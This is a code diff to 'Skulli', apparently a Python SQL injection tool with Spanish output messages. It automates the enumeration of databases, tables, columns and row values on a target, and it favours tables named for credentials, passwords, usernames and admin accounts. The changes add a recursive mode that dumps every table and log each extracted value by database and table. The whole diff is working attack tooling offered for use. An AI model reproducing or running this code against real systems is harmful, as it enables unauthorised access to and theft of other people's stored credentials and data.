@@ -49,16 +49,22 @@ class Skulli:
         self.characters = string.ascii_letters + string.digits + '_-$#@!.,<>?;:* '
         self.old_data = self.data[self.skll]
         self.good_words = ['login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
+        self.global_dbs = ''
+        self.global_tbs = ''
 
         
-    def create_log(self,header,logs,separator=','):
+    def create_log(self,header,option,logs,separator=','):
         log_name = f'{self.log}.txt'
-        if path.exists(log_name) and header == 'Databases':
+        if path.exists(log_name) and header == 'Databases' and not self.recursive:
             remove(log_name)
         try:
             with open(log_name, 'a') as skll_log:
                 parse_logs = logs.replace(separator, '\n')
-                skll_log.write(f"{header}:\n\n{parse_logs}")
+                if header != 'Databases':
+                    skll_log.write(f"{header} - ({option}):\n\n{parse_logs}")
+                else:
+                    skll_log.write(f"{header}:\n\n{parse_logs}")
+
         except Exception as e:
             print(e)
         
@@ -69,7 +75,7 @@ class Skulli:
             list_options = options.copy()
         lower_options = [word.lower() for word in list_options]
         
-        if len(options) == 1:
+        if len(options) == 1 or self.recursive:
             return 0
         
         for word in self.good_words:
@@ -77,15 +83,6 @@ class Skulli:
                 index = lower_options.index(word)
                 self.good_words.pop(index)
                 
-                return index,list_options
-        
-        old_options = list_options.copy()
-        bad_words = ['information_schema', 'performance_schema', 'mysql']
-        
-        for option in old_options:
-            if option not in bad_words:
-                index = list_options.index(option)
-                list_options.pop(index)
                 return index,list_options
         
         return self.which_options(options)
@@ -118,40 +115,46 @@ class Skulli:
     def recursion(self):
         len1 = self.get_databases_len()
         databases = self.get_databases(len1)
+        old_dbs = databases.split(',')
         while True:
-            option1,new_dbs = self.set_options(databases)
-            old_dbs = databases.split(',')
+            option1 = self.set_options(old_dbs)
             database = old_dbs[option1]
-            
+                
             print('\n')
 
             len2 = self.get_tables_len(database)
-            print(database)
+            
             if len2 == None:
                 print(f'[!] Ocurrio un error en ({database}), puede que no tenga permisos para esa base de datos/tabla/columna')
+                old_dbs.remove(database)
+                continue
             
-                while True:
-                    option1,new_dbs = self.set_options(old_dbs)
-                    database = new_dbs[option1]
-                    old_dbs = new_dbs
+                # while True:
+                #     option1,new_dbs = self.set_options(old_dbs)
+                #     database = new_dbs[option1]
+                #     old_dbs = new_dbs
+                #     self.global_dbs = new_dbs
 
-                    print('\n')
+                #     print('\n')
 
-                    len2 = self.get_tables_len(database)
-                    print(database)
-                    if len2 == None:
-                        print(f'[!] Ocurrio un error en ({database}), puede que no tenga permisos para esa base de datos/tabla/columna, elija otra')
-                        continue
-                    else:
-                        tables = self.get_tables(self.get_tables_len(database), database)
-                        old_tbs = tables.split(',')
-                        break
-                option2,new_tbs = self.set_options(old_tbs)
-                table = old_tbs[option2]
-            tables = self.get_tables(self.get_tables_len(database), database)
-            old_tbs = tables.split(',')
-            option2,new_tbs = self.set_options(old_tbs)
+                #     len2 = self.get_tables_len(database)
+                #     if len2 == None:
+                #         print(f'[!] Ocurrio un error en ({database}), puede que no tenga permisos para esa base de datos, elija otra')
+                #         old_dbs.remove(database)
+                #         continue
+                #     break
+            
+            if self.global_tbs == '' and type(self.global_tbs) != list:
+                tables = self.get_tables(self.get_tables_len(database), database)
+                self.global_tbs = tables.split(',')
+                old_tbs = self.global_tbs.copy()
+            else:
+                old_tbs = self.global_tbs.copy()
+            if len(old_tbs) == 0:
+                break
+            option2 = self.set_options(old_tbs)
             table = old_tbs[option2]
+            self.global_tbs.pop(option2)
 
             print('\n')
 
@@ -161,6 +164,8 @@ class Skulli:
             print('\n')
 
             self.get_values(self.get_values_len(database,table,columns),database,table,columns)
+            # print('\n\n[+] Programa finalizado\n')
+            # return
 
     def condition_of_request(self, match):
         if match.isdigit():
@@ -249,7 +254,7 @@ class Skulli:
         self.data[self.skll] = self.old_data
 
         if self.log:
-            self.create_log('Databases', databases)
+            self.create_log('Databases', '' , databases)
         return databases
 
     def get_tables_len(self, db):
@@ -316,7 +321,7 @@ class Skulli:
         self.data[self.skll] = self.old_data
 
         if self.log:
-            self.create_log('\n\nTables', tables)
+            self.create_log('\n\nTables', db, tables)
         return tables
 
     def get_columns_len(self, db, table):
@@ -384,7 +389,7 @@ class Skulli:
         self.data[self.skll] = self.old_data
 
         if self.log:
-            self.create_log('\n\nColumns', columns)
+            self.create_log('\n\nColumns', f'{db}->{table}', columns)
         return columns
 
     def get_values_len(self, db, table, columns):
@@ -466,13 +471,14 @@ class Skulli:
         self.data[self.skll] = self.old_data
 
         if self.log:
-            self.create_log('\n\nValues', values, separator)
+            self.create_log('\n\nValues', f'{db}->{table}->{columns.replace(",0x3a","")}', values, separator)
 
     def initial(self):
         p1 = print('[+] Iniciando SkullI')
         time.sleep(2)
         if self.recursive:
             self.recursion()
+            return
         len1 = self.get_databases_len()
         databases = self.get_databases(len1)
         option1,old_dbs,new_dbs = self.which_options(databases) if not self.automatic else self.set_options(databases)
